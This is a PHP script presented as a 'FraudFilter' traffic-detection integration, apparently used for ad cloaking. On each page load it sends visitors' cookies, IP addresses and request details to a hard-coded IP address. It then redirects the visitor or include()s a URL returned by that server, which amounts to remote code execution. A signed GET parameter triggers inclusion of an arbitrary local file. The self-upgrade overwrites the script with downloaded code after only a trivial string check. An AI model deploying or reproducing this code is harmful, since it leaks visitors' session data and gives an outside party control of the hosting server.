<?php
/**
 * Fraudfilter PHP Upload Code
 *
 * Version: 1.0.1
 * Author: Alex Shelznyev
 *
 * Minimum Supported Version: PHP 7.4
 * Preferred Versions: PHP 8.0, 8.1, 8.2, 8.3
 * 
 */

error_reporting(0);

class FraudFilterDetector_m710o {

    public function check() {

        ob_start();

        if (isset($_GET['ff17x_sign'], $_GET['ff17x_time']) && $this->isSignatureValid($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
            error_reporting(E_ALL);
            $this->runInMaintenanceMode();
            exit();
        }

        $resultObj = $this->sendRequestAndGetResult2(false);

        if ($resultObj->result || !0) {
            $this->action($resultObj);
        }
    }

    function url_origin($s)
    {
        $ssl      = ( ! empty( $s['HTTPS'] ) && $s['HTTPS'] == 'on' );
        $sp       = strtolower( $s['SERVER_PROTOCOL'] );
        $protocol = substr( $sp, 0, strpos( $sp, '/' ) ) . ( ( $ssl ) ? 's' : '' );
        $port     = $s['SERVER_PORT'];
        $port     = ( ( ! $ssl && $port=='80' ) || ( $ssl && $port=='443' ) ) ? '' : ':'.$port;
        $host     = $s['HTTP_HOST'];
        $host     = isset( $host ) ? $host : $s['SERVER_NAME'] . $port;
        return $protocol . '://' . $host;
    }

    function full_url($s)
    {
        return $this->url_origin($s) . $s['REQUEST_URI'];
    }

    function isSignatureValid($sign, $time) {
        return hash_equals(sha1('337edd97-86a1-4bd8-b4e1-a0c27a84e4fa.' . $this->getClid() . '.' . $time), $sign);
    }

    function runInMaintenanceMode() {
        $mode = $_GET['ff17x_mode'] ?? null;
        if ($mode === null) {
            return $this->returnError('Maintenance mode not set');
        }

        global $fbIncludedFileName, $fbIncludedHomeDir;

        $fileName = $fbIncludedFileName ?: __FILE__;
        $home = $fbIncludedHomeDir ?: dirname(__FILE__);

        switch ($mode) {
            case 'upgrade':
                return $this->upgradeScript($home, $fileName);
            case 'diagnostics':
                return $this->performDiagnostics($home, $fileName);
            default:
                return $this->returnError('Undefined maintenance mode: ' . $mode);
        }
    }

    function redirect($url) {
        $url = filter_var($url, FILTER_SANITIZE_URL);
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            throw new InvalidArgumentException('Invalid URL provided');
        }

        if (!function_exists('headers_sent') || !headers_sent()) {
            header('Location: ' . $url, true, 302);
            die();
        }

        $escapedUrl = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Redirecting...</title>
        <meta name="robots" content="noindex,nofollow">
        <script type="text/javascript">
            window.location.replace('<?= $escapedUrl ?>');
        </script>
        <noscript>
            <meta http-equiv="refresh" content="0;url='<?= $escapedUrl ?>'">
        </noscript>
    </head>
    <body>
        You are being redirected to <a href="<?= $escapedUrl ?>" target="_top">your destination</a>.
        <script type="text/javascript">
            window.location.replace('<?= $escapedUrl ?>');
        </script>
    </body>
    </html>
<?php
        die();
    }


    function returnError($message) {
         echo('{"success":false, "errorMessage":"'.$message.'"}');
    }

    function returnErrorByCode($code, $args) {
        echo json_encode([
            'success' => false,
            'extErrors' => [['code' => $code, 'args' => $args]],
            'version' => 4
        ]);
    }

    function getClid() {
        return 'm710o';
    }

    function appendGetParameters($url, $getParameters) {
        if (!$getParameters) {
            return $url;
        }
        $separator = strpos($url, '?') !== false ? '&' : '?';
        return $url . $separator . $getParameters;
    }
    function action($result) {
        if (!isset($result->type)) {
            $this->safeAction();
            return;
        }
        
        switch ($result->type) {
            case 'u':
                $this->redirect($result->url);
                break;
            case 'f':
                include($result->url);
                exit;
            default:
                $this->safeAction();
        }
    }
    function safeAction() {
        $this->redirect('https://carthd.com/efas');
    }

function performDiagnostics($home, $fileName) {
    header("X-FF: true");
    $errors = [];
    $extErrors = [];

    if (isset($_GET['ff17x_checkfile'])) {
        $filename = $_GET['ff17x_checkfile'];
        $result = $this->checkFile($filename);
        echo json_encode($result);
        return;
    }

    $success = true;
    $permissionsIssues = $this->hasPermissionsIssues($home, $fileName);
    if ($permissionsIssues) {
        $extErrors[] = $permissionsIssues;
        $success = false;
    }

    // Measure curl connection issues
    $curlConnectionIssues = $this->measureConnectionIssues($this->getCurlConnectionIssues());

    // Measure contents connection issues
    $contentsConnectionIssues = $this->measureConnectionIssues($this->getContentsConnectionIssues());

    $result = [
        'success' => $success,
        'version' => 6,
        'diagnostics' => true,
        'errors' => $errors,
        'extErrors' => $extErrors,
        'phpversion' => phpversion(),
        'connection' => $curlConnectionIssues,
        'contentsConnection' => $contentsConnectionIssues
    ];
    echo json_encode($result);
}

private function measureConnectionIssues($issues) {
    $time_start = microtime(true);
    $issues->duration = microtime(true) - $time_start;
    return $issues;
}

function getCurlConnectionIssues() {
    return $this->sendRequestAndGetResultCurl2(true);
}

function getContentsConnectionIssues() {
    return $this->sendRequestAndGetResultFileGetContents2(true);
}

function checkFile($filename) {
    $extErrors = array();
    if (!file_exists($filename)) {
        $extErrors[] = array('code' => 'FILE_NOT_FOUND','args' => array($filename));
        return array('success' => false, 'diagnostics' => true, 'extErrors' => $extErrors, 'version' => 6);
    }
    include ($filename);
    return "--- end of file inclusion ---";
}


function getUpgradeScriptViaContents($home, $fileName) {
    $opts = [
        'http' => [
            'method'  => 'GET',
            'header'  => 'x-ff-secret: 337edd97-86a1-4bd8-b4e1-a0c27a84e4fa',
            'timeout' => 2
        ]
    ];

    $context = stream_context_create($opts);
    return @file_get_contents($this->getFileNameForUpdates("contents"), false, $context);
}

function getFileNameForUpdates($type) {
    return "https://api.fraudfilter.io/v1/integration/get-updates?clid=".$this->getClid().'&integrationType=DEFAULT&type='.$type;
}

function upgradeScript($home, $fileName) {
    $output = $this->getUpgradeScriptViaContents($home, $fileName);
    if ($output === false || !$this->isSignature2Valid($output)) {
        $ch = curl_init($this->getFileNameForUpdates("curl"));

        curl_setopt_array($ch, [
            CURLOPT_DNS_CACHE_TIMEOUT => 120,
            CURLOPT_CONNECTTIMEOUT    => 5,
            CURLOPT_TIMEOUT           => 10,
            CURLOPT_HTTPHEADER        => ['x-ff-secret: 337edd97-86a1-4bd8-b4e1-a0c27a84e4fa'],
            CURLOPT_RETURNTRANSFER    => 1
        ]);

        $output = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        if (!$output) {
            curl_close($ch);
            return $this->returnError('Server returned empty answer. HTTP error: ' . $http_status);
        }

        $curl_error_number = curl_errno($ch);
        curl_close($ch);

        if ($curl_error_number) {
            return $this->returnErrorByCode("CURL_ERROR_" . $curl_error_number, null);
        }
    }

    if (!$this->isSignature2Valid($output)) {
        return $this->returnErrorByCode("WRONG_SIGNATURE", null);
    }

    $tempFileName = $fileName.'.downloaded';
    if (file_put_contents($tempFileName, $output) === false) {
        return $this->returnErrorByCode("WRITE_PERMISSION", [$tempFileName, $home]);
    }

    if (!rename($tempFileName, $fileName)) {
        return $this->returnErrorByCode("WRITE_PERMISSION", [$tempFileName, $home]);
    }

    echo json_encode(['success' => true, 'errorMessage' => '']);
}

function isSignature2Valid($content) {
    return strpos($content, '@FraudFilter.io 20') !== false;
}

function checkSignature($content) {
    return array('code' => 'WRONG_SIGNATURE');
}

function hasPermissionsIssues($home, $fileName) {
    $tempFileName = $fileName.'.tempfile';
    if (!@touch($tempFileName)) {
        return ['code' => 'WRITE_PERMISSION', 'args' => [$tempFileName, $home]];
    }
    
    return @unlink($tempFileName) ? "" : ['code' => 'UNABLE_TO_DELETE_TEMP_FILE', 'args' => [$tempFileName, $home]];
}
    function concatQueryVars($originalUrl) {
        $secondUri = $_SERVER['REQUEST_URI'];
        $url = strstr($originalUrl, '?', true) ?: $originalUrl;
        $firstQuery = parse_url($originalUrl, PHP_URL_QUERY);
        $secondQuery = parse_url($secondUri, PHP_URL_QUERY);
        
        if (!$secondQuery) {
            return $originalUrl;
        }
        
        if (!$firstQuery) {
            return $url . '?' . $secondQuery;
        }
        
        return $url . '?' . $firstQuery . '&' . $secondQuery;
    }
    function sendRequestAndGetResult2($diagnostics) {
        return $this->sendRequestAndGetResultCurl2($diagnostics);
    }

    function sendRequestAndGetResultCurl2($diagnostics) {
        $resultObj = new stdClass();
        $resultObj->result = false;

        if ($diagnostics && !function_exists('curl_init')) {
            $resultObj->curlAnswerType = "NO_CURL";
            return $resultObj;
        }

        $url = "http://130.211.20.155/m710o";
        $nParam = '0f1bn';
        if (isset($_GET[$nParam])) {
            $url .= '&' . $nParam . '=' . $_GET[$nParam];
        }
        if ($diagnostics) {
            $url .= "?diagnostics=true";
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => 1,
            CURLOPT_HTTPHEADER => $this->fillAllPostHeaders(),
            CURLOPT_DNS_CACHE_TIMEOUT => 120,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_TCP_NODELAY => 1,
        ]);

        $output = curl_exec($ch);
        $curl_error_number = curl_errno($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CURL_ANSWER";
            $resultObj->output = $output;
            $resultObj->httpCode = $http_status;
            $resultObj->curlErrorNumber = $curl_error_number;
        } elseif ($output === '' || strlen($output) <= 3) {
            $this->notifyAboutError("ANSWER_ERROR_curl_error_number_" . $curl_error_number . '_output' . $output . '_http_status_' . $http_status);
        } else {
            $this->processOutput($resultObj, $output, $curl_error_number, $http_status);
        }

        curl_close($ch);
        return $resultObj;
    }

    function sendRequestAndGetResultFileGetContents2($diagnostics) {
        $time_start = microtime(true);
        $resultObj = new stdClass();
        $resultObj->result = false;

        $url = "http://130.211.20.155/m710o";
        $nParam = '0f1bn';
        if (isset($_GET[$nParam])) {
            $url .= '&' . $nParam . '=' . $_GET[$nParam];
        }
        if ($diagnostics) {
            $url .= "?diagnostics=true";
        }

        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => $this->getHeadersAsOneString($this->fillAllPostHeaders()),
                'timeout' => 2,
                'ignore_errors' => true
            ]
        ]);

        $output = file_get_contents($url, false, $context);
        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CONTENTS_ANSWER";
            $resultObj->output = $output;
        } elseif ($output === '' || strlen($output) <= 3) {
            $this->notifyAboutError("ANSWER_ERROR_contents_diff=" . (microtime(true) - $time_start) . '_output=' . $output);
        } else {
            $this->processOutput($resultObj, $output, null, null);
        }

        return $resultObj;
    }

    private function processOutput(&$resultObj, $output, $curl_error_number = null, $http_status = null) {
        $result = $output[0];
        $sep = $output[1];
        if ($result != '0' && $result != '1' || $sep != ';') {
            $this->notifyAboutError("INVALID_PREFIX" . ($curl_error_number ? "_curl_error_number_$curl_error_number" : "") . '_output' . $output . ($http_status ? "_http_status_$http_status" : ""));
        }
        $resultObj->type = substr($output, 2, 1);
        $resultObj->url = substr($output, 4);
        $resultObj->result = ($result === '1') ? 1 : (($output === '0') ? 0 : false);
    }

    function getHeadersAsOneString($headers) {
        $endline = "\n";
        return implode($endline, $headers) . $endline;
    }

    function fillAllPostHeaders() {
        $headers = [
            'content-length: 0',
            'X-FF-P: 337edd97-86a1-4bd8-b4e1-a0c27a84e4fa'
        ];

        $headerMappings = [
            'X-FF-REMOTE-ADDR' => 'REMOTE_ADDR',
            'X-FF-X-FORWARDED-FOR' => 'HTTP_X_FORWARDED_FOR',
            'X-FF-X-REAL-IP' => 'HTTP_X_REAL_IP',
            'X-FF-DEVICE-STOCK-UA' => 'HTTP_DEVICE_STOCK_UA',
            'X-FF-X-OPERAMINI-PHONE-UA' => 'HTTP_X_OPERAMINI_PHONE_UA',
            'X-FF-HEROKU-APP-DIR' => 'HEROKU_APP_DIR',
            'X-FF-X-FB-HTTP-ENGINE' => 'X_FB_HTTP_ENGINE',
            'X-FF-X-PURPOSE' => 'X_PURPOSE',
            'X-FF-REQUEST-SCHEME' => 'REQUEST_SCHEME',
            'X-FF-CONTEXT-DOCUMENT-ROOT' => 'CONTEXT_DOCUMENT_ROOT',
            'X-FF-SCRIPT-FILENAME' => 'SCRIPT_FILENAME',
            'X-FF-REQUEST-URI' => 'REQUEST_URI',
            'X-FF-SCRIPT-NAME' => 'SCRIPT_NAME',
            'X-FF-PHP-SELF' => 'PHP_SELF',
            'X-FF-REQUEST-TIME-FLOAT' => 'REQUEST_TIME_FLOAT',
            'X-FF-COOKIE' => 'HTTP_COOKIE',
            'X-FF-ACCEPT-ENCODING' => 'HTTP_ACCEPT_ENCODING',
            'X-FF-ACCEPT-LANGUAGE' => 'HTTP_ACCEPT_LANGUAGE',
            'X-FF-CF-CONNECTING-IP' => 'HTTP_CF_CONNECTING_IP',
            'X-FF-INCAP-CLIENT-IP' => 'HTTP_INCAP_CLIENT_IP',
            'X-FF-QUERY-STRING' => 'QUERY_STRING',
            'X-FF-X-FORWARDED-FOR' => 'X_FORWARDED_FOR',
            'X-FF-ACCEPT' => 'HTTP_ACCEPT',
            'X-FF-X-WAP-PROFILE' => 'X_WAP_PROFILE',
            'X-FF-PROFILE' => 'PROFILE',
            'X-FF-WAP-PROFILE' => 'WAP_PROFILE',
            'X-FF-REFERER' => 'HTTP_REFERER',
            'X-FF-HOST' => 'HTTP_HOST',
            'X-FF-VIA' => 'HTTP_VIA',
            'X-FF-CONNECTION' => 'HTTP_CONNECTION',
            'X-FF-X-REQUESTED-WITH' => 'HTTP_X_REQUESTED_WITH',
            'User-Agent' => 'HTTP_USER_AGENT',
            'Expected' => ''
        ];

        foreach ($headerMappings as $out => $in) {
            $this->addHeader($headers, $out, $in);
        }

        $hh = $this->getallheadersFF();
        foreach ($hh as $key => $value) {
            if (strtolower($key) === 'host') {
                $headers[] = 'X-FF-HOST-ORDER: ' . array_search($key, array_keys($hh));
                break;
            }
        }

        return $headers;
    }

    function getallheadersFF() {
        $headers = array();
        foreach ( $_SERVER as $name => $value ) {
            if ( substr( $name, 0, 5 ) == 'HTTP_' ) {
                $headers[ str_replace( ' ', '-', ucwords( strtolower( str_replace( '_', ' ', substr( $name, 5 ) ) ) ) ) ] = $value;
            }
        }
        return $headers;
    }

    function addHeader(& $headers, $out, $in) {
        if (!isset( $_SERVER[$in] )) {
            return;
        }
        $value = $_SERVER[$in];
        if (is_array($value)) {
            $value = implode(',', $value);
        }
        $headers[] = $out.': '.$value;
    }

    function setError($resultObj, $code, $param1 = null, $param2 = null, $param3 = null) {
        $resultObj->errorCode = $code;
        $resultObj->error = $code;
        if ($param1 != null) {
            $resultObj->$param1 = $param1;
        }
        if ($param2 != null) {
            $resultObj->$param2 = $param2;
        }
        if ($param3 != null) {
            $resultObj->$param3 = $param3;
        }
        return $resultObj;
    }

    function notifyAboutError($message) {
        $len = strlen($message);
        if ($len > 800) {
            $message = substr($message, 0, 800);
        }
        $message = urlencode($message);

        $url = 'http://log.fraudfilter.io/ff-php?v=ff1&guid=m710o&m='.$message;
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);

        $output = curl_exec($ch);
    }


}

$fraudFilterDetector_m710o = new FraudFilterDetector_m710o();
$fraudFilterDetector_m710o->check();

// @FraudFilter.io
?>

